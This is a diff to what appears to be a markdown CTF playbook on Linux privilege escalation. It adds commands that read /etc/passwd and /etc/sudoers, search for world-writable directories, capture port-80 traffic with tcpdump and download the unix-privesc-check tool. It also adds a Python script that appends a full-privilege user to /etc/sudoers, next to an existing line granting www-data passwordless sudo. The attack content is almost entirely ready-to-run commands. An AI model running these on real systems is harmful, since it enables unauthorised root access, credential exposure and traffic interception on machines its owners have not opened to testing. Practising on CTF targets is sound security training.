@@ -193,6 +193,15 @@ $ cat /proc/version; uname -a; uname -mrs; rpm -q kernel; dmesg | grep Linux; ls
 $ cat /etc/profile; cat /etc/bashrc; cat ~/.bash_profile; cat ~/.bashrc; cat ~/.bash_logout; env; set
 $ mount; df -h; cat /etc/fstab
 
+# Find other Users
+ $id; who; w; last; cat /etc/passwd | cut -d: -f1; echo 'sudoers:'; cat /etc/sudoers; sudo -l
+
+# World Readable / Writable Files 
+$ echo "world-writeable folders"; find / -writable -type d 2>/dev/null; echo "world-writeable folders"; find / -perm -222 -type d 2>/dev/null; echo "world-writeable folders"; find / -perm -o w -type d 2>/dev/null; echo "world-executable folders"; find / -perm -o x -type d 2>/dev/null; echo "world-writeable & executable folders"; find / \( -perm -o w -perm -o x \) -type d 2>/dev/null;
+
+# Inspect web traffice
+$ tcpdump tcp port 80 -w output.pcap -i eth0
+
 
 # look at cronjobs that runs as root with incorrect permissions
 ```
@@ -215,6 +224,12 @@ ps aux | grep root
 
 #Add user www-data to sudoers with no password
 $ echo 'chmod 777 /etc/sudoers && echo "www-data ALL=NOPASSWD:ALL" >> /etc/sudoers && chmod 440 /etc/sudoers' > /tmp/update
+```
+
+__Automate Scripts__
+
+```bash
+wget https://github.com/pentestmonkey/unix-privesc-check
 ```
 
 __If You have a Reverse Shell...__
@@ -262,7 +277,17 @@ __Metasploit__
 ``` bash
 meterpreter: $ getsystem
 ```
-
+__Python Scripts__
+```python
+# Add sudoers
+#!/usr/bin/env python
+import os
+import sys
+try:
+        os.system('echo "username ALL=(ALL:ALL) ALL" >> /etc/sudoers')
+except:
+        sys.exit()
+```
 # Actions on Objectives 
 Gather necessary CTF documentation (flags)
 [![Alt text](/images/ctf-playbook-icon.png "Play Icon")](#celebration)  
